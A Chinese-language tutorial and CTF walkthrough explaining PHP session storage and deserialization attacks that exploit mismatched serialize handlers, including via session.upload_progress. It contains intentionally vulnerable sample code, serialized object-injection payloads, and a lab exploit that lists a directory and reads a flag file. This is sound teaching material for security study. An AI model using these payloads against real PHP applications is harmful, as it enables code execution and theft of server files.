在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。

当第一次访问网站时，Seesion\_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session\_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。

除此之外，还需要知道session\_start()这个函数已经这个函数所起的作用：

当会话自动开始或者通过 session\_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $\_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess\_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。

session 的存储机制php中的session中的内容不是放在内存中，而是以文件的方式来存储，存储方式由配置项session.save\_handler来进行确定，默认是以文件的方式存储。存储的文件是以sess\_sessionid来进行命名的。

常见的session存储路径：

```php
/var/lib/php5/sess_PHPSESSID
/var/lib/php7/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSED
```

php.ini中一些session配置：

```php
session.save_path="" --设置session的存储路径
session.save_handler=""–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.serialize_handler string–定义用来序列化/反序列化session的处理器名字。默认使用php
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-62a0b4877445b8104c19c7104afdcf1e03e8d242.png)

2、session反序列化简单利用
-----------------

session反序列化的漏洞是由三种不同的反序列化引擎所产生的的漏洞：

php\_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

php:存储方式是，键名+竖线+经过serialize()函数序列处理的值

php\_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值

三种引擎的存储格式：

```php
php : a|s:3:"wzk";
php_serialize : a:1:{s:1:"a";s:3:"wzk";}
php_binary : as:3:"wzk";
```

样例源码

```php
<?php
//ini_set('session.serialize_handler', 'php');
ini_set("session.serialize_handler", "php_serialize");
//ini_set("session.serialize_handler", "php_binary");
session_start();
$_SESSION['lemon'] = $_GET['a'];
echo "";
var_dump($_SESSION);
echo "";
?>
```

```php
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class student{
    var $name;
    var $age;
    function __wakeup(){
        echo "hello ".$this->name."!";
    }
}
?>
```

攻击思路：

首先访问1.php，在传入的参数最开始加一个'|'，由于1.php是使用php\_serialize引擎处理，因此只会把'|'当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到'|'时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对'|'后的值进行反序列化处理。

这里可能会有一个小疑问，为什么在解析session文件时直接对'|'后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session\_start()这个函数，可以看下官方说明：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-08b434c44670c2b26d570add08ec6fa262f25e0f.png)

首先生成一个payload：

```php
<?php
    class student{
        var $name;
        var $age;
    }
    $a = new student();
    $a->name =  "daye";
    $a->age = "100";
    echo serialize($a);
?>

#O:7:"student":2:{s:4:"name";s:4:"daye";s:3:"age";s:3:"100";}
```

攻击思路中说到了因为不同的引擎会对'|'，产生歧义，所以在传参时在payload前加个'|'，作为a参数

payload:

```php
|O:7:"student":2:{s:4:"name";s:4:"daye";s:3:"age";s:3:"100";}
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-30de38b3350b1a1a25c800b380534da07ff68659.png)

访问1.php,查看一下本地session文件，发现payload已经存入到session文件

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-c7ba4a75c56064f16f538adc81581b0c6dcafac3.png)

php\_serialize引擎传入的payload作为lemon对应值，而php则完全不一样：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-9ea4fc3715fc7d27d330a5045f1b7cca4d39de4e.png)

访问一下2.php看看会有什么结果

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-92724c49e49b5530469270bf45a67505cff6f1eb.png)

成功触发了student类的\_\_wakeup()方法,所以这种攻击思路是可行的。

3、利用session.upload\_progress进行反序列化攻击
------------------------------------

在PHP中还存在一个upload\_process机制，即自动在$\_SESSION中创建一个键值对，值中刚好存在用户可控的部分，可以看下官方描述的，这个功能在文件上传的过程中利用session实时返回上传的进度。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-c883077e526b1a806c4fef00026f787bd4d38598.png)

当题目中没有上面类似于PHP1写入$\_SESSION全局变量时，可以利用session.upload\_progress进行反序列化攻击。这种攻击方法与上一部分基本相同，不过这里需要先上传文件，同时POST一个与session.upload\_process.name的同名变量（一般为PHP\_SESSION\_UPLOAD\_PROGRESS）。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。下次请求就会反序列化session文件，从中取出这个键。所以攻击点还是跟上一部分一模一样，程序还是使用了不同的session处理引擎。

例题：Jarvis OJ——PHPINFO

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-a82988940d4a6f9ac06881ff9f811bbb1935091c.png)

当我们随便传入一个值时，便会触发\_\_construct()魔法函数，从而出现phpinfo页面，在phpinfo页面发现

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-7396930f35f4c2da0ab757ac7ab8cdec74385683.png)

发现默认的引擎是php-serialize，而题目所使用的引擎是php，因为反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。

通过POST方法来构造数据传入$\_SESSION，首先构造POST提交表单

```php
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-9b26214ea64d1972758b9302fc36aeb33a65c83e.png)

接下来构造序列化payload

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='payload';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

将payload改为如下代码：

```php
print_r(scandir(dirname(__FILE__)));
#scandir目录中的文件和目录
#dirname函数返回路径中的目录部分
#__FILE__   php中的魔法常量,文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名
#序列化后的结果
O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}
```

为防止双引号被转义，在双引号前加上\\，除此之外还要加上|

```php
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

在这个页面随便上传一个文件，然后抓包修改filename的值

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-e840440de7e2b36c1eaa52bf6e41964f58291c6b.png)

可以看到Here\_1s\_7he\_fl4g\_buT\_You\_Cannot\_see.php这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-5d82f9025f8b43eee600ff234d4018b6aa4bfb58.png)

$\_SERVER\['SCRIPT\_FILENAME'\] 也是包含当前运行脚本的路径，与 $\_SERVER\['SCRIPT\_NAME'\] 不同的

既然知道了路径，就继续构造payload即可

```php
print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));
#file_get_contents() 函数把整个文件读入一个字符串中。
```

接下来的就还是序列化然后改一下格式传入即可